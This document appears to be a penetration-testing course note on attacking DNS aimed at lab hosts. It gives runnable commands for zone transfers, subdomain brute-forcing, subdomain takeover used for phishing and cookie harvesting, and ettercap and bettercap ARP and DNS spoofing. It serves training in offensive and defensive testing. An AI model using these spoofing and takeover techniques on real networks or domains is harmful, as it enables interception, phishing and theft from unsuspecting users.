---
tags: [attack, enumeration/dns, attack/network]
module: attacking_common_services
last_updated: 2026-05-11
source_count: 2
---

# Attacking DNS

DNS attack techniques: zone transfer exploitation, subdomain enumeration, subdomain takeover, and cache poisoning/spoofing.

## Overview

DNS rarely blocks attacks directly, but it exposes infrastructure topology (zone transfers), misconfigured delegation (subdomain takeover), and can be weaponized for phishing or MITM (cache poisoning). These techniques span both offensive reconnaissance and active exploitation.

See [[enumeration/dns]] for passive DNS recon and record-type enumeration.

## Zone transfer (AXFR)

A misconfigured DNS server answering AXFR requests leaks all DNS records for a zone.

```bash
# Check available nameservers
dig NS inlanefreight.htb @10.129.14.128

# Attempt zone transfer against each NS
dig AXFR inlanefreight.htb @10.129.14.128

# Loop across all nameservers
for ns in $(dig +short NS inlanefreight.htb @10.129.14.128); do
    echo "=== $ns ==="
    dig AXFR inlanefreight.htb @$ns
done
```

Zone transfer success reveals internal hostnames, IPs, and mail routing — effectively the full network map for that domain.

## Subdomain enumeration

### Passive (certificate transparency)

```bash
curl -s "https://crt.sh/?q=%.inlanefreight.com&output=json" | jq -r '.[].name_value' | sort -u
```

### Active (subfinder + DNS brute-force)

```bash
# Passive multi-source aggregation
subfinder -d inlanefreight.com -v

# DNS brute-force with subbrute
git clone https://github.com/TheRook/subbrute.git
python3 subbrute.py inlanefreight.com -s /opt/useful/SecLists/Discovery/DNS/namelist.txt

# All-in-one with dnsenum
dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 \
        -o subdomains.txt -f /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt \
        inlanefreight.htb
```

## Subdomain takeover

A subdomain pointing via CNAME to a deprovisioned third-party service (AWS S3, GitHub Pages, Heroku, etc.) can be claimed by registering the defunct resource.

### Detection

```bash
# Find CNAME records
dig CNAME customer-drive.inlanefreight.com

# If the CNAME target returns HTTP 404 or "NoSuchBucket" / "Repository not found"
# the subdomain is likely vulnerable
curl -s http://customer-drive.inlanefreight.com
```

### Exploitation

1. Register the defunct resource (e.g., create a matching S3 bucket, GitHub Pages repo, Heroku app) with the same name the CNAME points to.
2. The subdomain now resolves to your controlled infrastructure.
3. Deliver phishing pages, harvest cookies, abuse CORS, defeat CSP, or perform CSRF.

Key insight: the company's DNS entry still says `customer-drive.inlanefreight.com CNAME old-bucket.s3.amazonaws.com`. You just registered `old-bucket` as a new S3 bucket — so you now own what the CNAME points to.

Scale: RedHuntLabs 2020 study found 424,120 potentially takeable subdomains across 220 million domains scanned; 62% were in e-commerce.

## DNS cache poisoning / spoofing

Compromise a DNS resolver's cache to redirect victims to attacker-controlled IPs. Requires ability to intercept or race DNS responses (LAN-level position or exploitable resolver).

### Ettercap (on-path)

```bash
# Edit /etc/ettercap/etter.dns — map target domain to attacker IP
echo "*.inlanefreight.com A 10.10.14.15" >> /etc/ettercap/etter.dns

# Launch ARP poisoning + DNS spoof
ettercap -T -q -i eth0 -P dns_spoof -M arp:remote /10.129.14.128// /10.129.14.1//
```

### Bettercap (alternative)

```bash
bettercap -iface eth0
# In bettercap prompt:
net.probe on
set dns.spoof.all true
set dns.spoof.domains inlanefreight.com
dns.spoof on
```

## Gotchas & notes

- AXFR is not universally blocked; always try every nameserver, not just the primary
- Subdomain takeover requires registering the resource on the third-party platform — not just finding the dangling CNAME
- Cache poisoning is LAN-level; remote DNS spoofing requires Kaminsky-style attack or a poisoned resolver
- Subdomain takeover can be used for cookie theft even over HTTPS (same-origin policy won't protect cookies set for `*.inlanefreight.com`)

## Related pages

- [[enumeration/dns]]
- [[tools/dig]]
- [[tools/dnsenum]]
- [[recon/osint/domain_information]]

## Sources

- raw/attacking_common_services/dns_attacking_dns.md
- raw/attacking_common_services/dns_latest_dns_vulnerabilities.md
